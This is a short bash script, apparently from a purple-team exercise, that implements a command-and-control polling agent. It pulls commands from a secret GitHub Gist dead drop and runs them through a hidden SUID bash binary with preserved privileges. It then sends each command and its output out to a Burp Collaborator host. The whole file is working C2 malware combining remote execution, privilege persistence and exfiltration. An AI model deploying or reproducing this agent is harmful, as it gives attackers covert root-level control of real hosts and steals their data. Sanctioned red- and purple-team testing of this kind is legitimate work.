#!/bin/bash
# Purple Team A1 - S5 C2 polling agent
# T1102.001: dead drop via secret GitHub Gist
# T1071.001: HTTP C2 channel to Burp Collaborator
GIST_URL="https://gist.githubusercontent.com/Refaelyk/8914d78f02965d423694c57b3969a823/raw/cmd.json"
BHOST="ua8v567e4ro553i1oj8br0fgu70yosch.oastify.com"
SUID_BASH="/var/tmp/.cache_helper"
LOG=/tmp/purple_team_a1_runlog.txt

CMD=$(curl -sfSL "$GIST_URL" \
  | python3 -c "import json,sys; d=json.load(sys.stdin); print(d['cmd']) if d.get('token')=='purple-team-a1' else exit(1)" 2>/dev/null)

[ -z "$CMD" ] && exit 0

RESULT=$($SUID_BASH -p -c "$CMD" 2>&1)
curl -sk "https://$BHOST/purple-team-a1-c2" \
  --data-urlencode "cmd=$CMD" \
  --data-urlencode "result=$RESULT" >/dev/null 2>&1
echo "[A1 C2] $(date -u +%Y-%m-%dT%H:%M:%SZ) cmd=$CMD" >> $LOG
